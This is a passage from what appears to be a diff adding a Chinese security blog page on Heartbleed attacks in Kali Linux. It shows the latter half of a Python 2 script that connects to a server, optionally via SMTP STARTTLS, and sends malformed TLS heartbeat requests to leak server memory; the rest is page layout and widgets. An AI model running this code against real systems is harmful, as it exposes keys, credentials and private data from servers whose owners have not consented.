dumpf, quiet)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server '</span>+ host +<span class="string">' returned error, likely not vulnerable'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(host, port, quiet)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Connecting...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tls</span><span class="params">(s, quiet)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseresp</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)</span><br><span class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># Look for server hello done message.</span></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">            <span class="keyword">return</span> ver</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(host, port, dumpf, quiet, starttls)</span>:</span></span><br><span class="line">    response = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> starttls:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s = smtplib.SMTP(host=host,port=port)</span><br><span class="line">            s.ehlo()</span><br><span class="line">            s.starttls()</span><br><span class="line">        <span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'STARTTLS not supported...'</span></span><br><span class="line">            s.quit()</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'STARTTLS supported...'</span></span><br><span class="line">        s.quit()</span><br><span class="line">        s = connect(host, port, quiet)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            re = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.send(<span class="string">'ehlo starttlstest\r\n'</span>)</span><br><span class="line">            re = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.send(<span class="string">'starttls\r\n'</span>)</span><br><span class="line">            re = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Timeout issues, going ahead anyway, but it is probably broken ...'</span></span><br><span class="line">        tls(s,quiet)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = connect(host, port, quiet)</span><br><span class="line">        tls(s,quiet)</span><br><span class="line"></span><br><span class="line">    version = parseresp(s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> version == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">"Got an error while parsing the response, bailing ..."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        version = version - <span class="number">0x0300</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">"Server TLS version was 1.%d\n"</span> % version</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> quiet: <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    <span class="keyword">if</span> (version == <span class="number">1</span>):</span><br><span class="line">        s.send(hbv10)</span><br><span class="line">        response = hit_hb(s,dumpf, host, quiet)</span><br><span class="line">    <span class="keyword">if</span> (version == <span class="number">2</span>):</span><br><span class="line">        s.send(hbv11)</span><br><span class="line">        response = hit_hb(s,dumpf, host, quiet)</span><br><span class="line">    <span class="keyword">if</span> (version == <span class="number">3</span>):</span><br><span class="line">        s.send(hbv12)</span><br><span class="line">        response = hit_hb(s,dumpf, host, quiet)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</span><br><span class="line">        options.print_help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Scanning '</span> + args[<span class="number">0</span>] + <span class="string">' on port '</span> + str(opts.port)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,opts.num):</span><br><span class="line">        check(args[<span class="number">0</span>], opts.port, opts.file, opts.quiet, opts.starttls)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2015/08/24/Pixie-Dust-Attack-WPS-in-Kali-Linux-with-Reaver/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">在Kali Linux下使用Pixie Dust与Reaver配合进行WPS攻击</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到：</span>
+		<a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+		<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="Heartbleed-Hacking-In-Kali-Linux" data-title="Heartbleed Hacking In Kali Linux" data-url="http://anysun.gitcafe.io/2015/11/09/Heartbleed-Hacking-In-Kali-Linux/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2015 Anysun
+    	</div>
+      	<div class="footer-right">
+      		Powered By <a href="http://www.anysuns.com" target="_blank">Anysun</a>  Theme By Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  </div>
+</body>
+</html>
